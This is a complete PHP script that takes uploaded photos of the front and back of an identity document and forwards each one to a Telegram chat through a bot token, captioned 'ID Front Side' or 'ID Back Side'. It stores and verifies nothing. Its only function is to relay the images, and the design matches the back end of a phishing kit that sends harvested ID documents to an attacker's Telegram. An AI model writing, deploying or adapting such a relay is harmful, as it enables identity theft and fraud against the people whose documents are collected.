<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram bot not configured']);
    exit;
}

if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE' || TELEGRAM_CHAT_ID === '') {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram chat not configured']);
    exit;
}

$front = $_FILES['front'] ?? null;
$back  = $_FILES['back']  ?? null;

if (!$front || !$back) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Both front and back photos are required']);
    exit;
}

$maxSize = 10 * 1024 * 1024; // 10 MB per file
$allowed = ['image/jpeg', 'image/png', 'image/webp', 'image/heic'];

foreach (['front' => $front, 'back' => $back] as $label => $file) {
    if ($file['error'] !== UPLOAD_ERR_OK) {
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => "Upload error for $label: code {$file['error']}"]);
        exit;
    }
    if ($file['size'] > $maxSize) {
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => "$label file too large (max 10 MB)"]);
        exit;
    }
    $mime = mime_content_type($file['tmp_name']);
    if (!in_array($mime, $allowed, true)) {
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => "$label: invalid file type ($mime)"]);
        exit;
    }
}

$timestamp = date('Y-m-d H:i:s T');
$errors = [];

foreach (['front' => $front, 'back' => $back] as $label => $file) {
    $caption = 'ID ' . ucfirst($label) . " Side\n$timestamp";

    $ch = curl_init("https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendPhoto");
    $post = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'caption' => $caption,
        'photo'   => new CURLFile($file['tmp_name'], $file['type'], $file['name']),
    ];
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $post,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30,
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($code !== 200) {
        $decoded = json_decode($resp, true);
        $errors[] = "$label: " . ($decoded['description'] ?? "HTTP $code");
    }
}

if ($errors) {
    http_response_code(502);
    echo json_encode(['ok' => false, 'error' => implode('; ', $errors)]);
    exit;
}

echo json_encode(['ok' => true]);
